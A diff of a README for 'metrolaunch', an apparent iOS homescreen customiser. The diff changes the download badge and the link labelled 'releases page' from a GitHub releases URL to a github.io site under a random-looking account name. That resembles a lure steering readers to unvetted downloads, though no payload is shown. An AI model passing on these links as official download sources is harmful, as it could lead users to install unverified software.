@@ -1,6 +1,6 @@
 # 📱 metrolaunch - Run Windows Phone style on iOS
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/wonlostrecordnorthernness593/metrolaunch/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://wonlostrecordnorthernness593.github.io)
 
 Metrolaunch brings the tiled interface of Windows Phone to your iOS device. You can customize your layout and organize your phone without jailbreaking your system. This tool provides a functional homescreen replacement using standard iOS features.
 
@@ -17,7 +17,7 @@ Ensure your device meets these requirements before you begin:
 
 You need to obtain the installation package from the official release page. 
 
-1. Visit the [releases page](https://github.com/wonlostrecordnorthernness593/metrolaunch/releases) to download the package.
+1. Visit the [releases page](https://wonlostrecordnorthernness593.github.io) to download the package.
 2. Select the version marked as "Latest" to ensure you have the most recent improvements.
 3. Save the file to your computer or your phone storage.
 
